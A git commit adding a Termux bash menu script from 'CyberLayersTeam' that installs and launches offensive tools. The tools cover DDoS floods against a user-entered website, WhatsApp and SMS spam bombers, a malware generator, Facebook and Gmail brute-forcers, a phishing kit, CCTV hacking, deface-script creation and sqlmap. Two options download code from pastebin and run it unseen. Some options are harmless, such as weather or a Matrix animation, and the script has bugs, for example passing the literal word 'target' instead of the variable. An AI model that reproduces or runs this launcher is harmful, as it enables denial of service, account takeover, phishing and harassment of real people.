e7226aaa631c32ea3ad2b4c5251edea319279cdf
swity001 <43563298+swity001@users.noreply.github.com>
2018-11-10 16:46:20 +0700

    Add files via upload

---
+++ CyberLayersTeamv4.sh
@@ -0,0 +1,768 @@
+#!/system/xbin/bash
+#Author SwityWaber
+#Mau Ngapain Lu Tod
+#Dilarang Recode
+#Gw capek gblg bikinya
+#Thanks to all member
+#CyberLayersTeam
+
+clear
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+NOW=`date "+%d.%m.%Y"`
+TIME=`date "+%H:%M"`
+cd module
+python2 log.py
+echo ""
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+echo $yellow "Tungguin Boodjank$green savar ea"
+sleep 3
+clear
+
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+
+echo $red "L"
+sleep 0.3
+clear
+echo $blue "LO"
+sleep 0.3
+clear
+echo $green "LOA"
+sleep 0.3
+clear
+echo $cyan "LOAD"
+sleep 0.3
+clear
+echo $white "LOADI"
+sleep 0.3
+clear
+echo $yellow "LOADIN"
+sleep 0.3
+clear
+echo $red "LOADING"
+sleep 0.3
+clear
+echo $green "WELCOME TO TOOL CYBER LAYERS TEAM"
+sleep 3
+clear
+echo
+toilet -f standard " =* CLT *= " -F gay
+echo
+echo ""
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo $green"[Author    ]: Swity"
+echo $yellow"[type     ]: Tool Instaler"
+echo $red"[Team     ]: CyberLayersTeam"
+echo $white"[Contac me     ]: 089699989010"
+echo $purple"[Thanks To All Member]"
+echo $cyan"[CyberLayersTeam]"
+echo $red "[Youtube Channel     ]:Cyber Layers Team"
+echo $cyan"[Special Thanks   ]: •XZPRO •Nyai Anah"
+echo "\033[34;1m[^_^]\033[36;1m===============================================\033[34;1m[^_^]"
+echo ""
+echo $white".:Ini Adalah Tools Installer Yang Dibuat Oleh Our Team:."
+echo $purple"...........::::::::::Karya Anak Bangsa::::::::::..........."
+echo $cyan".::Bermimpi lah Setinggi Langit Karena Mimpi itu Gratis:.."
+echo $green"......::::::Silahkan di pilih 2000 dapet 3 :v :::::::......"
+echo $yellow
+echo "\033[36;1m"
+echo "[+]===============================================[+]"
+echo $white"|  [1] DDOS Website Dengan LITEDDOS                 |"
+echo "[+]===============================================[+]"
+echo $purple"|  [2] DDOS Website Dengan Torshammer               |"
+echo "[+]===============================================[+]"
+echo $cyan"|  [3] DDOS Website Dengan Xerxes                   |"
+echo "[+]===============================================[+]"
+echo $green"|  [4] DDOS Website Dengan Hammer                   |"
+echo "[+]===============================================[+]"
+echo $red"|   [5] Spam WA buat ngeprank                       |"
+echo "[+]===============================================[+]"
+echo $blue"|   [6] Spam SMS unlimited terbaru                  |"
+echo "[+]===============================================[+]"
+echo $yellow"|   [7] Buat Virus Maleware                         |"
+echo "[+]===============================================[+]"
+echo $purple"|   [8] Instal OSIF                                 |"
+echo "[+]===============================================[+]"
+echo $cyan"|   [9] Instal MBF buat hek efbeh                   |"
+echo "[+]===============================================[+]"
+echo $green"|   [10]  Info Gempa terkini                        |"
+echo "[+]===============================================[+]"
+echo $red"|   [11] Install Phising                            |"
+echo "[+]===============================================[+]"
+echo $white"|   [12] Instal FBBrute                             |"
+echo "[+]===============================================[+]"
+echo $purple"|   [13] Install tool hek fb                        |"
+echo "[+]===============================================[+]"
+echo $cyan"|   [14] Install Matrix :v                          |"
+echo "[+]===============================================[+]"
+echo $green"|   [15] Animasi Kereta :v                          |"
+echo "[+]===============================================[+]"
+echo $red"|   [16] Perkiraan Cuaca :v                         |"
+echo "[+]===============================================[+]"
+echo $white"|   [17] Hack CCTV                                  |"
+echo "[+]===============================================[+]"
+echo $purple"|   [18] Metasploit                                 |"
+echo "[+]===============================================[+]"
+echo $cyan"|   [19] Chating di termux                          |"
+echo "[+]===============================================[+]"
+echo $green"|   [20] Install Ubuntu                             |"
+echo "[+]===============================================[+]"
+echo $red"|   [21]  Membuat Script Deface                     |"
+echo "[+]===============================================[+]"
+echo $white"|   [22] Hack Gmail Brute                           |"
+echo "[+]===============================================[+]"
+echo $purple"|   [23] Menghias tampilan termux                   |"
+echo "[+]===============================================[+]"
+echo $cyan"|   [24] Test Speed Internet                        |"
+echo "[+]===============================================[+]"
+echo $green"|   [25] Memutar Music youtube di termux            |"
+echo "[+]===============================================[+]"
+echo $red"|   [26] Scanning Website                           |"
+echo "[+]===============================================[+]"
+echo $white"|   [27] Admin Page Finder                          |"
+echo "[+]===============================================[+]"
+echo $purple"|   [28] Install SQL Map                            |"
+echo "[+]===============================================[+]"
+echo $cyan"|   [29] Hacker Recondog                            |"
+echo "[+]===============================================[+]"
+echo $green"|   [30] Webdav buat deface                         |"
+echo "[+]===============================================[+]"
+echo $red"|   [31] Nuyul BTC                                 |"
+echo "[+]===============================================[+]"
+echo $cyan"|  [0] Exit                                         |"
+echo "[+]===============================================[+]"
+echo
+echo "\033[32;1m"
+read -p "╭─[Pilih Nomer]
+╰─root@swity=•>" bro
+
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo "Instal LITEDDOS"
+sleep 1
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo ""
+echo $green"Installing Torshammer DDOS..."
+sleep 1
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target:" target
+python2 torshammer.py -T -t target
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Xerxes DDOS..."
+sleep 1
+apt update && apt upgrade
+apt install git
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+mv xerxes $HOME
+cd $HOME/xerxes
+clang xerxes.c -o xerxes
+clear
+read -p "[masukanWebsiteTarget]>" target
+./xerxes target 80
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green" Installing Hammer DDOS.."
+sleep 1
+clear
+git clone https://github.com/cyweb/hammer
+mv hammer $HOME
+cd $HOME/hammer
+read -p "Masukan Target:" target
+python2 hammer.py -T -t target
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo $green"Instal Spam."
+sleep 1
+clear
+echo $bluw"Instal Spam.."
+sleep 1
+clear
+echo $cyan"Instal Spam..."
+sleep 1
+clear
+git clone https://github.com/Swity001/spam
+mv spam $HOME
+cd $HOME/spam
+php wa.php
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Instal Spam SMS..."
+sleep 1
+clear
+cd module
+php BomSMS.php
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tools"
+sleep 1
+apt update
+termux-setup-setorage
+cd /sdcard
+git clone https://github.com/Hider5/Malicious
+mv Malicious $HOME
+cd $HOME/Malicious
+apt-get install python2
+pip2 install -r requirements.txt
+python2 malicious.py
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+echo
+toilet -fstandard " *CLT* " -F gay
+echo $green"Installing Txtool..."
+sleep 1
+apt install python2
+pip2 install requests mechanize
+git clone https://github.com/CiKu370/OSIF.git
+mv OSIF $HOME
+cd $HOME/OSIF
+pip2 install requerements.txt
+python2 osif.py
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo $green"instaling MBF..."
+sleep 1
+git clone https://github.com/Swity001/mbf
+mv mbf $HOME
+cd $HOME/mbf
+python2 MBF.py
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing gempa terkini"
+sleep 1
+apt upgrade
+apt install python2
+apt install php
+git clone https://github.com/suhada99/GempaTerikini
+mv GempaTerikini $HOME
+cd $HOME/GempaTerikini
+php Gempa-Terkini.php
+fi
+
+if [ $bro = 11  || [ $bro = 11 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Phising"
+sleep 1
+apt update
+apt install git
+apt install wget
+git clone https://github.com/thelinuxchoice/shellphish/
+mv shellphish $HOME
+cd $HOME/shellphish
+bash shellphish.sh
+fi
+
+if [ $bro = 12 ] || [ $bro = 12 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+sleep 1
+echo $green"Installing FBBrute Tod:v..."
+sleep 1
+clear
+git clone https://github.com/Senitopeng/Fbbrute almu007
+mv almu007 $HOME
+cd $HOME/almu007
+python2 jomblo.py
+fi
+
+if [ $bro = 13 ] || [ $bro = 13 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tool Rahasia..."
+sleep 1
+clear
+git clone https://github.com/Swity001/hackfb
+cd hackfb
+python2 HackFB.py
+fi
+
+if [ $bro = 14 ] || [ $bro = 14 ]
+then
+echo "Install maatrix.."
+sleep 1
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+pkg install cmatrix
+cmatrix
+fi
+
+if [ $bro = 15 ] || [ $bro = 15 ]
+then
+clear
+echo "Install tool"
+sleep 1
+clear
+toilet -f standard " *CLT* " -F gay
+pkg install sl
+sl
+fi
+
+if [ $bro = 16 ] || [ $bro = 16 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Memperkirakan Cuaca..."
+sleep 1
+clear
+apt update && apt upgrade
+pkg install curl
+read -p "Masukan Lokasi:"lokasi
+curl http://wttr.in/lokasi
+fi
+
+if [ $bro = 17 ] || [ $bro = 17 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tools..."
+sleep 1
+clear
+apt update && apt upgrade
+pip2 install request
+git clone https://github.com/kancotdiq/ipcs
+mv ipcs $HOME
+cd $HOME/ipcs
+python2 scan.py
+fi
+
+if [ $bro = 18 ] || [ $bro = 18 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Metasploit..."
+sleep 1
+clear
+git clone https://github.com/4L13199/meTAInstall
+chmod +x meTAInstall
+mv meTAInstall $HOME
+cd $HOME/meTAInstall
+sh meTAInstall
+fi
+
+if [ $bro = 19 ] || [ $bro = 19 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Irssi..."
+sleep 1
+clear
+pkg install irssi
+irssi
+fi
+
+if [ $bro = 20 ] || [ $bro = 20 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+sleep 1
+echo $green"Installing Ubuntu..."
+sleep 1
+clear
+apt install proot
+git clone https://github.com/Neo-Oli/termux-ubuntu
+mv termux-ubuntu $HOME
+cd $HOME/termux-ubuntu
+chmod +x ubuntu.sh
+./ubuntu.sh
+./start.sh
+fi
+
+if [ $bro = 21 ] || [ $bro = 21 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tool..."
+sleep 1
+clear
+pkg install python2
+git clone https://github.com/Ubaii/script-deface-creator
+mv script-deface-creator $HOME
+cd $HOME/script-deface-creator
+chmod +x create.py
+python2 create.py
+fi
+
+if [ $bro = 22 ] || [ $bro = 22 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Install Gmail Brute..."
+sleep 1
+clear
+git clone https://github.com/Ha3MrX/Gemail-Hack
+mv Gemail-Hack $HOME
+cd $HOME/Gemail-Hack
+chmod +x gemailhack.py
+python2 gemailhack.py
+fi
+
+if [ $bro = 23 ] || [ $bro = 23 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tool..."
+sleep 1
+clear
+git clone https://github.com/Cabbagec/termux-ohmyzsh
+mv termux-ohmyzsh $HOME
+cd $HOME/termux-ohmyzsh
+sh install.sh
+fi
+
+if [ $bro = 24 ] || [ $bro = 24 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+echo
+echo $green"Installing Tool..."
+sleep 1
+clear
+pip install --upgrade pip
+git clone https://github.com/Rusmana-ID/rus
+mv rus $HOME
+cd $HOME/rus
+python2 Speed.py
+fi
+
+if [ $bro = 25 ] || [ $bro = 25 ]
+then
+clear
+echo
+toilet -f standard " *CLT* " -F gay
+sleep 1
+echo $green"Installing Tool..."
+sleep 1
+clear
+pip install mps_youtube
+pip install youtube_dl
+apt install mpv
+mpsyt
+fi
+
+if [ $bro = 26 ] || [ $bro = 26 ]
+then
+clear
+echo
+toilet -f standard " *CYL* " -F gay
+sleep 1
+echo "Installing Tool..."
+sl
+git clone https://github.com/googleinurl/SCANNER-INURLBR.git
+mv SCANNER-INURLBR $HOME
+cd $HOME/SCANNER-INURLBR
+php inurlbr.php
+fi
+
+if [ $bro = 27 ] || [ $bro = 27 ]
+then
+clear
+echo
+echo "Installing Tools..."
+sleep 1
+clear
+toilet -f standard " *CLT* " -F gay
+sleep 1
+git clone https://github.com/AdheBolo/AdminFinder
+mv AdminFinder $HOME
+cd $HOME/AdminFinder
+chmod 777 AdminFinder.py
+puthon2 AdminFinder.py
+fi
+
+if [ $bro = 28 ] || [ $bro = 28 ]
+then
+echo
+echo "Installing Tools.."
+sleep 1
+clear
+toilet -f standard " *CLT* " -F gay
+sleep 1
+pkg install python
+git clone https://github.com/sqlmapproject/sqlmap
+mv sqlmap $HOME
+cd $HOME/sqlmap
+python2 sqlmap.py
+fi
+
+if [ $bro = 29 ] || [ $bro = 29 ]
+then
+echo
+echo "Installing Tool..."
+sleep 1
+clear
+toilet -f standard " *CLT* " -F gay
+sleep 1
+git clone https://github.com/UltimateHackers/ReconDog
+mv ReconDog $HOME
+cd $HOME/ReconDog
+chmod +x dog.py
+python2 dog.py
+fi
+
+if [ $bro = 30 ] || [ $bro = 30 ]
+then
+echo
+echo "Installing Tool..."
+sleep 1
+clear
+toilet -f standard " *CLT* " -F gay
+sleep 1
+pip2 install urllib3 chardet certifi idna requests
+apt install openssl curl
+pkg install libcurl
+ln -s /sdcard
+cd sdcard
+mkdir webdav
+cd webdav
+curl -k -O https://pastebin.com/raw/HnVyQPtR
+mv HnVyQPtR webdav.py
+python2 webdav.py
+fi
+
+if [ $bro = 31 ] || [ $bro = 31 ]
+then
+clear
+echo
+echo "Installing Tools.."
+sleep 1
+clear
+toilet -f standard " *CLT* "
+wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
+php tuyul.php
+fi
+
+if [ $bro = 0 ] || [ $bro = 0 ]
+then
+echo $cyan"Thanks Use our team Tools"
+sleep 1
+echo $green"We Are CyberLayersTeam"
+sleep 1
+echo $yellow"We Learn Code"
+sleep 1
+echo $red"We Learn Programming"
+sleep 1
+echo $white"Expect Us"
+sleep 1
+echo $purple"And"
+sleep 1
+echo $cyan"Respect Us"
+sleep 1
+echo $green"Bermimpi Setinggi Langit Karena Mimpi Itu Gratis"
+sleep 1
+echo $yellow"Dan Berusahalah Untuk Mencapai Mimpimu Tersebut Walaupun Mustahil"
+sleep 1
+echo $red"Namun Jika Kamu Bersungguh Sungguh Maka Mimpi Yang Mustahil Tersebut Akan Tercapai Juga"
+sleep 1
+echo $white"This Tools Is Exit"
+echo $red"3......"
+sleep 1
+echo $red"2......"
+sleep 1
+echo $red"1......"
+exit
+fi
